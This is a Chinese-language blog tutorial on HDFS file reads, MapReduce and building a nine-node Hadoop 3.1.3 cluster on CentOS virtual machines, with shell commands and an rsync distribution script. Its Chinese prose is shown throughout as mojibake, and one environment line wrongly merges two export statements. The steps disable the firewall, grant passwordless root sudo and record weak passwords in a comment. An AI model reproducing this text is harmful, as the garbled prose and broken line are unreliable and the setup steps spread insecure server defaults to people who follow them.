<li>æŒ‚æ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ²¡å…³ç³»ï¼Œè¿˜æœ‰å…¶ä»–èŠ‚ç‚¹å¯ä»¥å¤‡ä»½ï¼›ç”šè‡³ï¼ŒæŒ‚æ‰æŸä¸€ä¸ªæœºæ¶ï¼Œä¹Ÿæ²¡å…³ç³»ï¼›å…¶ä»–æœºæ¶ä¸Šï¼Œä¹Ÿæœ‰å¤‡ä»½ã€‚</li>
</ol>
</li>
</ol>
<h3 id="HDFSæ–‡ä»¶è¯»å–"><a href="#HDFSæ–‡ä»¶è¯»å–" class="headerlink" title="HDFSæ–‡ä»¶è¯»å–"></a>HDFSæ–‡ä»¶è¯»å–</h3><p>å½“æ–‡ä»¶è¯»å–ï¼š</p>
<ol>
<li>Clientå‘NameNodeå‘èµ·æ–‡ä»¶è¯»å–çš„è¯·æ±‚ã€‚</li>
<li>NameNodeè¿”å›æ–‡ä»¶å­˜å‚¨çš„blockå—ä¿¡æ¯ã€åŠå…¶blockå—æ‰€åœ¨DataNodeçš„ä¿¡æ¯ã€‚</li>
<li>Clientè¯»å–æ–‡ä»¶ä¿¡æ¯ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115382.png" alt="ttt078ctfp"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼ŒClientè¦ä»DataNodeä¸Šï¼Œè¯»å–FileAã€‚è€ŒFileAç”±block1å’Œblock2ç»„æˆã€‚è¯»æ“ä½œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>Clientå‘NameNodeå‘é€è¯»è¯·æ±‚ã€‚</li>
<li>NameNodeæŸ¥çœ‹Metadataä¿¡æ¯ï¼Œè¿”å›FileAçš„blockçš„ä½ç½®ã€‚<ol>
<li>block1:host2,host1,host3</li>
<li>block2:host7,host8,host4</li>
</ol>
</li>
<li>blockçš„ä½ç½®æ˜¯æœ‰å…ˆåé¡ºåºçš„ï¼Œå…ˆè¯»block1ï¼Œå†è¯»block2ã€‚è€Œä¸”block1å»host2ä¸Šè¯»å–ï¼›ç„¶åblock2ï¼Œå»host7ä¸Šè¯»å–ã€‚</li>
</ol>
<p>ä¸Šé¢ä¾‹å­ä¸­ï¼ŒClientä½äºæœºæ¶å¤–ï¼Œé‚£ä¹ˆå¦‚æœClientä½äºæœºæ¶å†…æŸä¸ªDataNodeä¸Šï¼Œä¾‹å¦‚,Clientæ˜¯host6ã€‚é‚£ä¹ˆè¯»å–çš„æ—¶å€™ï¼Œéµå¾ªçš„è§„å¾‹æ˜¯ï¼š<strong>ä¼˜é€‰è¯»å–æœ¬æœºæ¶ä¸Šçš„æ•°æ®ã€‚</strong></p>
<h3 id="MapReduceæ ¸å¿ƒæ€æƒ³"><a href="#MapReduceæ ¸å¿ƒæ€æƒ³" class="headerlink" title="MapReduceæ ¸å¿ƒæ€æƒ³"></a>MapReduceæ ¸å¿ƒæ€æƒ³</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115383.png" alt="image-20210701084254232"></p>
<ul>
<li><p>åˆ†å¸ƒå¼çš„è¿ç®—ç¨‹åºå¾€å¾€éœ€è¦åˆ†æˆè‡³å°‘ 2 ä¸ªé˜¶æ®µã€‚</p>
</li>
<li><p>ç¬¬ä¸€ä¸ªé˜¶æ®µçš„ MapTask å¹¶å‘å®ä¾‹ï¼Œå®Œå…¨å¹¶è¡Œè¿è¡Œï¼Œäº’ä¸ç›¸å¹²ã€‚</p>
</li>
<li><p>ç¬¬äºŒä¸ªé˜¶æ®µçš„ ReduceTask å¹¶å‘å®ä¾‹äº’ä¸ç›¸å¹²ï¼Œä½†æ˜¯ä»–ä»¬çš„æ•°æ®ä¾èµ–äºä¸Šä¸€ä¸ªé˜¶æ®µ</p>
</li>
</ul>
<p>çš„æ‰€æœ‰ MapTask å¹¶å‘å®ä¾‹çš„è¾“å‡ºã€‚</p>
<ul>
<li>MapReduce ç¼–ç¨‹æ¨¡å‹åªèƒ½åŒ…å«ä¸€ä¸ª Map é˜¶æ®µå’Œä¸€ä¸ª Reduce é˜¶æ®µï¼Œå¦‚æœç”¨æˆ·çš„ä¸š</li>
</ul>
<p>åŠ¡é€»è¾‘éå¸¸å¤æ‚ï¼Œé‚£å°±åªèƒ½å¤šä¸ª MapReduce ç¨‹åºï¼Œä¸²è¡Œè¿è¡Œã€‚</p>
<h2 id="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"><a href="#äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ" class="headerlink" title="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"></a>äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ</h2><h3 id="å‡†å¤‡ä¸‰å°ä¸»æœºMacBook-proï¼ŒWindows-10-1ï¼ŒWindows-10-2"><a href="#å‡†å¤‡ä¸‰å°ä¸»æœºMacBook-proï¼ŒWindows-10-1ï¼ŒWindows-10-2" class="headerlink" title="å‡†å¤‡ä¸‰å°ä¸»æœºMacBook proï¼ŒWindows 10-1ï¼ŒWindows 10-2"></a>å‡†å¤‡ä¸‰å°ä¸»æœºMacBook proï¼ŒWindows 10-1ï¼ŒWindows 10-2</h3><p>åœ¨mbpä¸Šç”¨Parallels Desktopå®‰è£…centos 7.5ï¼Œä¸»æœºåä¸ºhadoop102</p>
<p>åœ¨win10-1ç”¨VMware Workstationå®‰è£…centos 7.5ï¼Œä¸»æœºåä¸ºhadoop103</p>
<p>åœ¨win10-2ç”¨VMware Workstationå®‰è£…centos 7.5ï¼Œä¸»æœºåä¸ºhadoop104</p>
<p>ä¸‹é¢ä¸ºmacä¸Šçš„hadoop102çš„ä¸ºä¾‹ï¼Œwinä¹Ÿç”¨åŒæ ·æ–¹æ³•é…ç½®ä¸€å°æ¨¡æ¿æœºï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹ä¸»æœºå</span></span><br><span class="line">[hmw@hadoop102 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å…³é—­é˜²ç«å¢™</span></span><br><span class="line">[hmw@hadoop102 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop102 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ›å»ºhuangç”¨æˆ·</span></span><br><span class="line">[hmw@hadoop102 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop102 ~]$ passwd huang</span><br><span class="line"><span class="meta">#</span><span class="language-bash">rootå’Œhmwå¯†ç hmwï¼Œhuangå¯†ç yc</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®hmwç”¨æˆ·å…·æœ‰rootæƒé™</span></span><br><span class="line">[hmw@hadoop102 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨%wheel  ALL=(ALL) ALLè¿™è¡Œä¸‹é¢æ·»åŠ ä¸€è¡Œ</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿™ä¸€è¡Œä¸è¦ç›´æ¥æ”¾åˆ° root è¡Œä¸‹é¢ï¼Œå› ä¸ºæ‰€æœ‰ç”¨æˆ·éƒ½å±äº wheel ç»„ï¼Œä½ å…ˆé…ç½®äº†huangå…·æœ‰å…å¯†åŠŸèƒ½ï¼Œä½†æ˜¯ç¨‹åºæ‰§è¡Œåˆ°%wheelè¡Œæ—¶ï¼Œè¯¥åŠŸèƒ½åˆè¢«è¦†ç›–å›éœ€è¦å¯†ç ã€‚æ‰€ä»¥huangè¦æ”¾åˆ°%wheelè¿™è¡Œä¸‹é¢ã€‚</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop102 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop102 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop102 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop102 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹è¿™ä¸¤ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€æœ‰å±ç»„</span></span><br><span class="line">[hmw@hadoop102 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop102 ~]$ ll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¸è½½è™šæ‹Ÿæœºè‡ªå¸¦çš„JDK</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm-qa:æŸ¥è¯¢æ‰€å®‰è£…çš„æ‰€æœ‰rpmè½¯ä»¶åŒ…</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep -i:å¿½ç•¥å¤§å°å†™</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">xargs -n1:è¡¨ç¤ºæ¯æ¬¡åªä¼ é€’ä¸€ä¸ªå‚æ•°</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm -e â€“nodeps:å¼ºåˆ¶å¸è½½è½¯ä»¶</span></span><br><span class="line">[hmw@hadoop102 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">[hmw@hadoop102 ~]$ reboot</span><br></pre></td></tr></table></figure>

<h3 id="å…‹éš†è™šæ‹Ÿæœº"><a href="#å…‹éš†è™šæ‹Ÿæœº" class="headerlink" title="å…‹éš†è™šæ‹Ÿæœº"></a>å…‹éš†è™šæ‹Ÿæœº</h3><p>åœ¨mbpä¸Šåˆ©ç”¨æ¨¡ç‰ˆè™šæ‹Ÿæœºå…‹éš†ä¸‰å°è™šæ‹Ÿæœºhadoop102ï¼ˆ192.168.58.31ï¼‰ hadoop109(192.168.58.107) hadoop110(192.168.58.155) ï¼Œå…‹éš†çš„æ—¶å€™å…ˆå…³é—­è™šæ‹Ÿæœº</p>
<p>åœ¨win10-1ä¸Šåˆ©ç”¨æ¨¡ç‰ˆè™šæ‹Ÿæœºå…‹éš†ä¸‰å°è™šæ‹Ÿæœºhadoop103ï¼ˆ192.168.58.68ï¼‰ hadoop107(192.168.58.43) hadoop108(192.168.58.121) ï¼Œå…‹éš†çš„æ—¶å€™å…ˆå…³é—­è™šæ‹Ÿæœº</p>
<p>åœ¨win10-2ä¸Šåˆ©ç”¨æ¨¡ç‰ˆè™šæ‹Ÿæœºå…‹éš†ä¸‰å°è™šæ‹Ÿæœºhadoop104ï¼ˆ192.168.58.190ï¼‰ hadoop105(192.168.58.189) hadoop106(192.168.58.34) ï¼Œå…‹éš†çš„æ—¶å€™å…ˆå…³é—­è™šæ‹Ÿæœº</p>
<h4 id="ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹"><a href="#ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹" class="headerlink" title="ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹"></a>ä¿®æ”¹å…‹éš†æœºçš„ä¸»æœºåå’Œhostsï¼Œå·²hadoop102ä¸ºä¾‹</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹hostname</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹hosts</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="language-bash">mbp</span></span><br><span class="line">192.168.58.31 hadoop102</span><br><span class="line">192.168.58.107 hadoop109</span><br><span class="line">192.168.58.155 hadoop110</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-1</span></span><br><span class="line">192.168.58.68 hadoop103</span><br><span class="line">192.168.58.43 hadoop107</span><br><span class="line">192.168.58.121 hadoop108</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-2</span></span><br><span class="line">192.168.58.190 hadoop104</span><br><span class="line">192.168.58.189 hadoop105</span><br><span class="line">192.168.58.34 hadoop106</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">[huang@hadoop102 ~]$ reboot</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–è™šæ‹Ÿæœºä»¥ç›¸åŒæ–¹å¼å»ä¿®æ”¹</p>
<h4 id="ä¿®æ”¹ä¸»æœºMacçš„hosts"><a href="#ä¿®æ”¹ä¸»æœºMacçš„hosts" class="headerlink" title="ä¿®æ”¹ä¸»æœºMacçš„hosts"></a>ä¿®æ”¹ä¸»æœºMacçš„hosts</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % vi /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="language-bash">mbp</span></span><br><span class="line">192.168.58.31 hadoop102</span><br><span class="line">192.168.58.107 hadoop109</span><br><span class="line">192.168.58.155 hadoop110</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-1</span></span><br><span class="line">192.168.58.68 hadoop103</span><br><span class="line">192.168.58.43 hadoop107</span><br><span class="line">192.168.58.121 hadoop108</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-2</span></span><br><span class="line">192.168.58.190 hadoop104</span><br><span class="line">192.168.58.189 hadoop105</span><br><span class="line">192.168.58.34 hadoop106</span><br></pre></td></tr></table></figure>

<h3 id="åœ¨hadoop102å®‰è£…JDK"><a href="#åœ¨hadoop102å®‰è£…JDK" class="headerlink" title="åœ¨hadoop102å®‰è£…JDK"></a>åœ¨hadoop102å®‰è£…JDK</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å°†macä¸­ä¸‹è½½å¥½çš„jdkå¯¼å…¥åˆ°hadoop102è™šæ‹Ÿæœºçš„/opt/softwareç›®å½•ä¸‹</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦å¯¼å…¥æˆåŠŸ</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è§£å‹</span></span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®JDKç¯å¢ƒå˜é‡</span></span><br><span class="line">[huang@hadoop102 ~]$  sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©æ–°çš„ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</span></span><br><span class="line">[huang@hadoop102 ~]$ source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">[huang@hadoop102 ~]$ java -version</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="åœ¨hadoop102å®‰è£…Hadoop"><a href="#åœ¨hadoop102å®‰è£…Hadoop" class="headerlink" title="åœ¨hadoop102å®‰è£…Hadoop"></a>åœ¨hadoop102å®‰è£…Hadoop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å°†macä¸­ä¸‹è½½å¥½çš„hadoopå¯¼å…¥åˆ°hadoop102è™šæ‹Ÿæœºçš„/opt/softwareç›®å½•ä¸‹</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/hadoop-3.1.3.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">è§£å‹</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf hadoop-3.1.3.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">[huang@hadoop102 software]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ pwd</span><br><span class="line">/opt/module/hadoop-3.1.3</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sudo vi /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop version</span><br></pre></td></tr></table></figure>

<h3 id="Hadoopç›®å½•ç»“æ„"><a href="#Hadoopç›®å½•ç»“æ„" class="headerlink" title="Hadoopç›®å½•ç»“æ„"></a>Hadoopç›®å½•ç»“æ„</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">æ€»ç”¨é‡ 200</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 bin</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9æœˆ   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9æœˆ   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9æœˆ   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 share</span><br></pre></td></tr></table></figure>

<ul>
<li>bin ç›®å½•:å­˜æ”¾å¯¹ Hadoop ç›¸å…³æœåŠ¡(hdfsï¼Œyarnï¼Œmapred)è¿›è¡Œæ“ä½œçš„è„šæœ¬ </li>
<li>etc ç›®å½•:Hadoop çš„é…ç½®æ–‡ä»¶ç›®å½•ï¼Œå­˜æ”¾ Hadoop çš„é…ç½®æ–‡ä»¶</li>
<li>lib ç›®å½•:å­˜æ”¾ Hadoop çš„æœ¬åœ°åº“(å¯¹æ•°æ®è¿›è¡Œå‹ç¼©è§£å‹ç¼©åŠŸèƒ½)</li>
<li>sbin ç›®å½•:å­˜æ”¾å¯åŠ¨æˆ–åœæ­¢ Hadoop ç›¸å…³æœåŠ¡çš„è„šæœ¬</li>
<li>share ç›®å½•:å­˜æ”¾ Hadoop çš„ä¾èµ– jar åŒ…ã€æ–‡æ¡£ã€å’Œå®˜æ–¹æ¡ˆä¾‹</li>
</ul>
<h3 id="ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬"><a href="#ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬" class="headerlink" title="ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬"></a>ç¼–å†™é›†ç¾¤åˆ†å‘è„šæœ¬</h3><h4 id="rsyncå’Œscpçš„åŒºåˆ«"><a href="#rsyncå’Œscpçš„åŒºåˆ«" class="headerlink" title="rsyncå’Œscpçš„åŒºåˆ«"></a>rsyncå’Œscpçš„åŒºåˆ«</h4><p>rsync ä¸»è¦ç”¨äºå¤‡ä»½å’Œé•œåƒã€‚å…·æœ‰é€Ÿåº¦å¿«ã€é¿å…å¤åˆ¶ç›¸åŒå†…å®¹å’Œæ”¯æŒç¬¦å·é“¾æ¥çš„ä¼˜ç‚¹ã€‚</p>
<p>rsync å’Œ scp åŒºåˆ«:ç”¨ rsync åšæ–‡ä»¶çš„å¤åˆ¶è¦æ¯” scp çš„é€Ÿåº¦å¿«ï¼Œrsync åªå¯¹å·®å¼‚æ–‡ä»¶åšæ›´</p>
<p>æ–°ã€‚scp æ˜¯æŠŠæ‰€æœ‰æ–‡ä»¶éƒ½å¤åˆ¶è¿‡å»ã€‚</p>
<h4 id="ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬"><a href="#ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬" class="headerlink" title="ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬"></a>ç¼–å†™xsyncé›†ç¾¤åˆ†å‘è„šæœ¬</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ ä¸€ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1. åˆ¤æ–­å‚æ•°ä¸ªæ•°</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="language-bash">2. éå†é›†ç¾¤æ‰€æœ‰æœºå™¨</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 hadoop105 hadoop106 hadoop107 hadoop108 hadoop109 hadoop110</span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta">	#</span><span class="language-bash">3. éå†æ‰€æœ‰ç›®å½•ï¼ŒæŒ¨ä¸ªå‘é€</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">4. åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. è·å–çˆ¶ç›®å½•</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. è·å–å½“å‰æ–‡ä»¶çš„åç§° </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†å‘ç¯å¢ƒå˜é‡"><a href="#åˆ†å‘ç¯å¢ƒå˜é‡" class="headerlink" title="åˆ†å‘ç¯å¢ƒå˜é‡"></a>åˆ†å‘ç¯å¢ƒå˜é‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹è„šæœ¬xsyncå…·æœ‰æ‰§è¡Œæƒé™</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†è„šæœ¬å¤åˆ¶åˆ°/binï¼Œä»¥ä¾¿å…¨å±€è°ƒç”¨</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœç”¨äº†sudoï¼Œé‚£ä¹ˆxsyncä¸€å®šè¦ç»™å®ƒçš„è·¯å¾„è¡¥å…¨</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åŒæ­¥ç¯å¢ƒå˜é‡é…ç½®ï¼ˆrootæ‰€æœ‰è€…ï¼‰</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ(åœ¨æœ‰æœºå™¨ä¸Šéƒ½éœ€è¦æ‰§è¡Œä¸‹é¢çš„æ“ä½œï¼Œä¸‹é¢ä¹Ÿhadoop103ä¸ºä¾‹)</span></span><br><span class="line">[huang@hadoop102 ~]$ ssh hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ source /etc/profile</span><br></pre></td></tr></table></figure>

<h3 id="SSHæ— å¯†ç ç™»é™†é…ç½®"><a href="#SSHæ— å¯†ç ç™»é™†é…ç½®" class="headerlink" title="SSHæ— å¯†ç ç™»é™†é…ç½®"></a>SSHæ— å¯†ç ç™»é™†é…ç½®</h3><h4 id="å…å¯†ç ç™»é™†åŸç†"><a href="#å…å¯†ç ç™»é™†åŸç†" class="headerlink" title="å…å¯†ç ç™»é™†åŸç†"></a>å…å¯†ç ç™»é™†åŸç†</h4><p><strong>1.é€šå¸¸çš„sshå¯†ç ç™»é™†è¿‡ç¨‹</strong></p>
<ul>
<li>ç”¨æˆ·å‘æ‰€è¦ç™»é™†çš„è¿œç¨‹ä¸»æœºå‘é€ç™»é™†è¯·æ±‚</li>
<li>è¿œç¨‹ä¸»æœºæ”¶åˆ°ç”¨æˆ·çš„ç™»å½•è¯·æ±‚ï¼ŒæŠŠè‡ªå·±çš„å…¬é’¥å‘é€ç»™ç”¨æˆ·</li>
<li>ç”¨æˆ·ä½¿ç”¨è¿™ä¸ªå…¬é’¥ï¼Œå°†ç™»é™†å¯†ç åŠ å¯†åï¼Œå‘é€ç»™è¿œç¨‹ä¸»æœº</li>
<li>è¿œç¨‹ä¸»æœºç”¨è‡ªå·±çš„ç§é’¥ï¼Œè§£å¯†ç™»é™†å¯†ç ï¼Œå¦‚æœå¯†ç æ­£ç¡®ï¼Œå°±åŒæ„ç”¨æˆ·ç™»é™†</li>
</ul>
<p>åœ¨linuxä¸­ï¼Œå¦‚æœç¬¬ä¸€æ¬¡é€šè¿‡sshç™»é™†è¿œç¨‹ä¸»æœºï¼Œä¼šå‡ºç°ä»¥ä¸‹æç¤ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">The authenticity of host &#x27;hadoop103 (192.168.58.68)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:wsBGThjnNNKRLdb8nms49AJFfnTt6erg5jHj4bCXm40.</span><br><span class="line">ECDSA key fingerprint is MD5:93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µè¯çš„æ„æ€æ˜¯ï¼Œæ— æ³•ç¡®è®¤hostä¸»æœºçš„çœŸå®æ€§ï¼Œå…¬é’¥æŒ‡çº¹å’ŒMD5å¯èƒ½ä¼šè¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢ï¼Œé—®ä½ è¿˜æƒ³ç»§ç»­å—ï¼Ÿ</p>
<p>æ‰€è°“çš„â€œå…¬é’¥æŒ‡çº¹â€ï¼Œæ˜¯æŒ‡å…¬é’¥é•¿åº¦è¾ƒé•¿ï¼ˆè¿™é‡Œé‡‡ç”¨RSAç®—æ³•ï¼Œé•¿è¾¾1024ä½ï¼‰ï¼Œå¾ˆéš¾æ¯”å¯¹ï¼Œæ‰€ä»¥å¯¹å…¶è¿›è¡ŒMD5è®¡ç®—ï¼Œå°†ä»–å˜æˆ128ä½çš„æŒ‡çº¹ã€‚ä¸Šåˆ—ä¸­æ˜¯93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.å†è¿›è¡Œæ¯”è¾ƒï¼Œå°±å®¹æ˜“å¤šäº†ã€‚</p>
<p>å‡å®šç»è¿‡é£é™©è¡¡é‡ä»¥åï¼Œç”¨æˆ·å†³å®šæ¥å—è¿™ä¸ªè¿œç¨‹ä¸»æœºçš„å…¬é’¥ã€‚</p>
